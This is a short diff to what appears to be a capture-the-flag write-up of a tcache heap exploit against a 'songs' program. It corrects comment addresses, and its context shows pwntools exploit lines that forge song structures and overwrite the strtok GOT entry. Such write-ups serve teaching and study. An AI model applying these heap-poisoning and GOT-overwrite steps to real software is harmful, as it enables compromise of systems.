@@ -509,7 +509,7 @@ We do the same thing as before to memset `songs[1].fd` to 0. Then we allocate a 
 # tcache bin 0x310 -> 0x4040c8 (songs[1])
 
 play_song("1") # Reads from STDIN, songs[0] = song #1
-p.sendline("767") # Gives us 0x04040b0 from tcache
+p.sendline("767") # Gives us 0x04040c8 from tcache
 
 ```
 
@@ -728,7 +728,7 @@ play_song("27") # Remove chunk C from 0x310 tcache bin
 """ Write To Songs Array """
 
 play_song("1") # Read from STDIN, songs[0] = song #1
-p.sendline("767") # Give lyrics "size" of 767 (will be given a 0x310 chunk), get 0x04040b0 from tcache
+p.sendline("767") # Give lyrics "size" of 767 (will be given a 0x310 chunk), get 0x04040c8 from tcache
 strtok_got_addr = p64(0x403fc8) # addr of .got:strtok_ptr
 fake_song = p64(0) * 3 + p64(0) + p64(0x404098) + p64(0)  + p64(0) # song = name + fd + dirnameptr + nameptr + lyricsptr
 p.send(strtok_got_addr + fake_song * 2) # Create fake song data for songs #3 and #4 and send payload w/ strtok addr
